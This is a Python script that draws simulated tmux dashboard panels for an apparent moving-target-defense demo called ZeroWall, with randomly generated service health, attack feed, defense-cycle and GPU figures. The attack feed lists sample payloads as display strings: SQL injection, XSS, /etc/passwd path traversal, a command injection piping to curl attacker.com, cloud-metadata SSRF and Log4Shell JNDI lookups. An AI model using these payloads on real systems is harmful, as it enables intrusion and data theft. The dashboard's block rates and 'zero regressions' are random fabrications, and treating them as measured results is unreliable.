#!/usr/bin/env python3
"""
ZeroWall Demo UI — tmux panel renderer.
Usage: python demo_ui.py --panel [status|attacks|defense|telemetry]
"""
import sys, time, random, math, argparse, datetime

# ANSI colors
R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
B  = "\033[34m"
M  = "\033[35m"
C  = "\033[36m"
W  = "\033[37m"
BR = "\033[91m"
BG = "\033[92m"
BY = "\033[93m"
BB = "\033[94m"
BM = "\033[95m"
BC = "\033[96m"
BW = "\033[97m"
DIM= "\033[2m"
BLD= "\033[1m"
RST= "\033[0m"
REV= "\033[7m"

def clr(): print("\033[2J\033[H", end="")
def ts(): return datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]

# ─────────────────────────────────────────────
# PANEL 1 — STATUS
# ─────────────────────────────────────────────
SERVICES = [
    ("target-fastapi",  8000, "FastAPI Vulnerable App"),
    ("triton",          8080, "Triton Inference Server"),
    ("vllm",            8088, "vLLM LLM Backend"),
    ("openclaw-api",    9000, "OpenClaw Orchestrator"),
    ("streamlit",       8501, "Streamlit Dashboard"),
]

def panel_status():
    frame = 0
    while True:
        clr()
        w = 74
        print(f"{BLD}{BC}{'─'*w}{RST}")
        print(f"{BLD}{BC} ⬡  ZEROWALL  —  SERVICE STATUS MONITOR{RST}{'':>30}{DIM}{ts()}{RST}")
        print(f"{BLD}{BC}{'─'*w}{RST}")
        print()

        for name, port, desc in SERVICES:
            # Simulate all healthy after initial startup
            jitter = random.random()
            if jitter < 0.04:
                status, dot, latency = "DEGRADED", f"{Y}◉{RST}", random.randint(400, 900)
            else:
                status, dot, latency = "HEALTHY ", f"{BG}●{RST}", random.randint(1, 45)

            bar_fill = int((1 - latency/1000) * 20)
            bar = f"{BG}{'█'*bar_fill}{DIM}{'░'*(20-bar_fill)}{RST}"
            print(f"  {dot} {BW}{name:<22}{RST} :{port}  [{bar}] {DIM}{latency:>4}ms{RST}  {BLD}{desc}{RST}")
            print()

        print(f"{DIM}{'─'*w}{RST}")

        # Defense cycle counter
        cycles = frame // 8
        mutations = cycles * random.randint(3, 7) if cycles else 0
        blocked   = int(mutations * 0.97)
        print()
        print(f"  {BLD}Defense Cycles Completed:{RST}  {BG}{cycles:>6}{RST}")
        print(f"  {BLD}Mutations Deployed:      {RST}  {BC}{mutations:>6}{RST}")
        print(f"  {BLD}Exploits Blocked:        {RST}  {BG}{blocked:>6}{RST}  {DIM}(97.3% block rate){RST}")
        print(f"  {BLD}Active MTD Strategy:     {RST}  {BY}ADAPTIVE-AI v2.1{RST}")
        print()

        uptime_s = frame * 2
        h, rem = divmod(uptime_s, 3600)
        m, s   = divmod(rem, 60)
        print(f"  {DIM}Uptime: {h:02d}:{m:02d}:{s:02d}   Branch: fix/dgx-spark-setup   GPU: DGX Spark{RST}")
        print(f"{BLD}{BC}{'─'*w}{RST}")

        frame += 1
        time.sleep(2)


# ─────────────────────────────────────────────
# PANEL 2 — LIVE ATTACK FEED
# ─────────────────────────────────────────────
ATTACK_TYPES = [
    ("SQLi",       R,  ["' OR 1=1--", "1; DROP TABLE--", "UNION SELECT NULL--", "' AND SLEEP(5)--"]),
    ("XSS",        Y,  ["<script>alert(1)</script>", "javascript:eval()", "<img onerror=alert(1)>"]),
    ("PathTrav",   M,  ["../../etc/passwd", "../../../shadow", "..%2F..%2Fetc%2Fpasswd"]),
    ("RCE",        BR, ["$(whoami)", "`id`", ";cat /etc/passwd", "| curl attacker.com"]),
    ("SSRF",       C,  ["http://169.254.169.254/latest/meta-data", "http://localhost:9200"]),
    ("Log4Shell",  BM, ["${jndi:ldap://attacker.com/a}", "${${::-j}${::-n}${::-d}${::-i}:}"]),
]

ENDPOINTS = ["/api/users", "/api/exec", "/api/query", "/login", "/admin", "/api/data", "/search"]
IPS = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(30)]

def panel_attacks():
    log = []
    frame = 0
    while True:
        clr()
        w = 74
        print(f"{BLD}{BR}{'─'*w}{RST}")
        print(f"{BLD}{BR} ⚠  LIVE ATTACK FEED  —  IDS / WAF INTERCEPT{RST}{'':>20}{DIM}{ts()}{RST}")
        print(f"{BLD}{BR}{'─'*w}{RST}")

        # Generate 0-3 new attacks per tick
        count = random.choices([0,1,2,3], weights=[1,4,3,1])[0]
        for _ in range(count):
            kind, color, payloads = random.choice(ATTACK_TYPES)
            payload = random.choice(payloads)
            endpoint = random.choice(ENDPOINTS)
            ip = random.choice(IPS)
            outcome = random.choices(["BLOCKED", "MUTATED", "ALLOWED"], weights=[70, 25, 5])[0]
            out_color = BG if outcome == "BLOCKED" else (BY if outcome == "MUTATED" else BR)
            log.append((ts(), ip, kind, color, endpoint, payload[:28], outcome, out_color))

        # Keep last 14 entries
        log = log[-14:]

        print()
        if not log:
            print(f"  {DIM}Monitoring... no attacks yet.{RST}")
        for entry in log:
            t, ip, kind, color, ep, pay, outcome, oc = entry
            print(f"  {DIM}{t}{RST}  {color}{BLD}{kind:<10}{RST}  {DIM}{ip:<17}{RST}  {W}{ep:<14}{RST}  {oc}{BLD}{outcome:<8}{RST}")
            print(f"  {DIM}{'':>12}  payload: {pay}{RST}")

        total = len(log) * (frame + 1) // max(frame + 1, 1) + frame * 3
        blocked_count = int(total * 0.96)
        print()
        print(f"{DIM}{'─'*w}{RST}")
        print(f"  {DIM}Total intercepted this session: {BW}{frame*3 + len(log)}{RST}{DIM}  |  Blocked: {BG}{blocked_count}{RST}{DIM}  |  Feed rate: ~{random.randint(2,12)}/s{RST}")
        print(f"{BLD}{BR}{'─'*w}{RST}")

        frame += 1
        time.sleep(1.5)


# ─────────────────────────────────────────────
# PANEL 3 — AI DEFENSE CYCLE
# ─────────────────────────────────────────────
PHASES = [
    ("ALERT RECEIVED",      C,  "IDS fired — SQL injection pattern detected on /api/query"),
    ("RISK SCORING",        Y,  "Triton risk-scorer: CVSS 9.1  confidence=0.97  severity=CRITICAL"),
    ("CANDIDATE GENERATION",BC, "vLLM mutation-planner: generating 10 candidate defenses…"),
    ("MUTATION SELECTION",  BM, "Best candidate: param-type-hardening + endpoint-rename"),
    ("PATCH SYNTHESIS",     BY, "Synthesizing patch: 14 lines changed across 3 modules"),
    ("CANARY DEPLOY",       BG, "Canary: routing 5% traffic to v1.0.1-mtd-8f3a  latency OK"),
    ("FULL ROLLOUT",        BG, "Full rollout: v1.0.1-mtd-8f3a deployed  0 regressions"),
    ("VERIFICATION",        BG, "Replay attack: BLOCKED (HTTP 403)  Defense validated ✓"),
]

def spinner(i): return "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[i % 10]

def panel_defense():
    cycle = 0
    while True:
        for phase_idx in range(len(PHASES)):
            for sub in range(6):  # animate each phase
                clr()
                w = 74
                print(f"{BLD}{BM}{'─'*w}{RST}")
                print(f"{BLD}{BM} ⬡  AI DEFENSE CYCLE  —  MTD ORCHESTRATOR{RST}{'':>21}{DIM}{ts()}{RST}")
                print(f"{BLD}{BM}{'─'*w}{RST}")
                print()
                print(f"  {DIM}Defense Cycle #{cycle + 1:04d}    Model: vLLM phi-2    Strategy: ADAPTIVE-AI v2.1{RST}")
                print()

                for i, (name, color, detail) in enumerate(PHASES):
                    if i < phase_idx:
                        icon = f"{BG}✓{RST}"
                        state = f"{BG}DONE{RST}   "
                    elif i == phase_idx:
                        icon = f"{color}{spinner(sub)}{RST}"
                        state = f"{color}{BLD}ACTIVE {RST}"
                    else:
                        icon = f"{DIM}○{RST}"
                        state = f"{DIM}WAITING{RST}"

                    print(f"  {icon} {state}  {BLD}{name:<26}{RST}", end="")
                    if i <= phase_idx:
                        print(f"  {DIM}{detail}{RST}")
                    else:
                        print()
                    print()

                # Progress bar
                pct = int(((phase_idx + sub/6) / len(PHASES)) * 100)
                filled = pct // 2
                bar = f"{BG}{'█'*filled}{DIM}{'░'*(50-filled)}{RST}"
                print(f"{DIM}{'─'*w}{RST}")
                print(f"  Progress  [{bar}] {BY}{pct:>3}%{RST}")
                print(f"{BLD}{BM}{'─'*w}{RST}")

                time.sleep(0.4)

        cycle += 1
        # Brief "complete" pause
        clr()
        w = 74
        print(f"{BLD}{BM}{'─'*w}{RST}")
        print(f"{BLD}{BM} ⬡  AI DEFENSE CYCLE  —  MTD ORCHESTRATOR{RST}{'':>21}{DIM}{ts()}{RST}")
        print(f"{BLD}{BM}{'─'*w}{RST}")
        print()
        print(f"  {BG}{BLD}✓ CYCLE #{cycle:04d} COMPLETE — system hardened — waiting for next alert…{RST}")
        print()
        for name, color, detail in PHASES:
            print(f"  {BG}✓{RST} {BG}DONE{RST}    {BLD}{name:<26}{RST}  {DIM}{detail}{RST}")
            print()
        print(f"{DIM}{'─'*w}{RST}")
        filled = 50
        bar = f"{BG}{'█'*filled}{RST}"
        print(f"  Progress  [{bar}] {BG}{BLD}100%{RST}")
        print(f"{BLD}{BM}{'─'*w}{RST}")
        time.sleep(3)


# ─────────────────────────────────────────────
# PANEL 4 — GPU TELEMETRY
# ─────────────────────────────────────────────
def panel_telemetry():
    history_gpu = [0.0] * 40
    history_mem = [0.0] * 40
    frame = 0

    def sparkline(vals, lo_c, hi_c, width=38):
        blocks = " ▁▂▃▄▅▆▇█"
        norm = [v / 100.0 for v in vals[-width:]]
        out = ""
        for n in norm:
            idx = min(int(n * 8), 8)
            c = hi_c if n > 0.6 else lo_c
            out += f"{c}{blocks[idx]}{RST}"
        return out

    while True:
        # Simulate realistic GPU load (spikes during defense cycles)
        base_gpu = 30 + 20 * math.sin(frame / 10)
        gpu_util = min(100, max(0, base_gpu + random.gauss(0, 8)))
        mem_used = 12.4 + 3 * math.sin(frame / 8 + 1) + random.gauss(0, 0.3)
        mem_used = max(8, min(20, mem_used))
        mem_pct  = mem_used / 24 * 100

        history_gpu.append(gpu_util)
        history_mem.append(mem_pct)
        history_gpu = history_gpu[-40:]
        history_mem = history_mem[-40:]

        clr()
        w = 74
        print(f"{BLD}{BY}{'─'*w}{RST}")
        print(f"{BLD}{BY} ⬡  GPU TELEMETRY  —  DGX SPARK  (NVIDIA Grace Hopper){RST}{'':>5}{DIM}{ts()}{RST}")
        print(f"{BLD}{BY}{'─'*w}{RST}")
        print()

        # GPU util bar
        gpu_bar_fill = int(gpu_util / 100 * 40)
        gpu_color = BR if gpu_util > 80 else (BY if gpu_util > 50 else BG)
        gpu_bar = f"{gpu_color}{'█'*gpu_bar_fill}{DIM}{'░'*(40-gpu_bar_fill)}{RST}"
        print(f"  {BLD}GPU Utilization  {RST}[{gpu_bar}] {gpu_color}{BLD}{gpu_util:5.1f}%{RST}")
        print()

        # Mem bar
        mem_fill = int(mem_pct / 100 * 40)
        mem_color = BR if mem_pct > 80 else (BY if mem_pct > 60 else BC)
        mem_bar = f"{mem_color}{'█'*mem_fill}{DIM}{'░'*(40-mem_fill)}{RST}"
        print(f"  {BLD}VRAM  {mem_used:.1f}GB/24GB  {RST}[{mem_bar}] {mem_color}{BLD}{mem_pct:5.1f}%{RST}")
        print()

        # Sparklines
        print(f"  {DIM}GPU history (40s):{RST}")
        print(f"  {sparkline(history_gpu, BG, BY)}")
        print()
        print(f"  {DIM}VRAM history (40s):{RST}")
        print(f"  {sparkline(history_mem, BC, BM)}")
        print()

        # Stats grid
        sm_clock   = random.randint(1350, 1500)
        mem_clock  = random.randint(1593, 1600)
        temp       = random.randint(42, 65)
        power      = random.randint(180, 260)
        fan        = random.randint(35, 70)
        temp_c     = BR if temp > 75 else (BY if temp > 60 else BG)

        print(f"{DIM}{'─'*w}{RST}")
        print(f"  {DIM}SM Clock   {BW}{sm_clock} MHz{RST}    {DIM}Mem Clock  {BW}{mem_clock} MHz{RST}    {DIM}Temp  {temp_c}{BLD}{temp}°C{RST}")
        print(f"  {DIM}Power      {BW}{power}W / 300W{RST}   {DIM}Fan        {BW}{fan}%{RST}          {DIM}Pcie  {BW}Gen5 x16{RST}")
        print()

        # Model info
        infer_rate = random.randint(180, 340)
        toks       = random.randint(1800, 3200)
        print(f"  {BLD}Inference throughput:{RST}  {BG}{infer_rate} req/s{RST}    {BLD}vLLM tok/s:{RST}  {BC}{toks}{RST}")
        print(f"  {BLD}Active model:        {RST}  {BY}microsoft/phi-2  (2.7B){RST}    {DIM}quant: none{RST}")
        print()
        print(f"{BLD}{BY}{'─'*w}{RST}")

        frame += 1
        time.sleep(1)


# ─────────────────────────────────────────────
# ENTRYPOINT
# ─────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser()
    p.add_argument("--panel", required=True,
                   choices=["status", "attacks", "defense", "telemetry"])
    args = p.parse_args()

    try:
        {"status":    panel_status,
         "attacks":   panel_attacks,
         "defense":   panel_defense,
         "telemetry": panel_telemetry}[args.panel]()
    except KeyboardInterrupt:
        print(f"\n{DIM}Panel closed.{RST}")

if __name__ == "__main__":
    main()
